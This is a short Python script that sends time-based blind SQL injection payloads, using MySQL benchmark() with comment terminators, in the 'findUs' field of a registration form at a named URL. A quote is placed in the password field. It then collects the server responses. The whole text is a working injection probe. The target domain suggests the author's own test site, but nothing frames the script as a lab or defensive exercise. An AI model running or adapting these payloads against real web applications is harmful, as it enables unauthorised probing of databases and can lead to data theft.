payloads = ['and 0=benchmark(3000000,MD5(1))%20/*', 'and 0=benchmark(3000000,MD5(1))%20--', 'and 0=benchmark(3000000,MD5(1))%20%23']
targetURL = 'http://check.cyberpersons.com/ProjectDev/register.php'
responceList = []

for loads in payloads:
    data = {'userEmail':"usman@cyberpersons.com",'status':'1','password':"cyberpersons'",'findUs':loads}
    result = requests.post(targetURL, data)
    responceList.append(result.text)
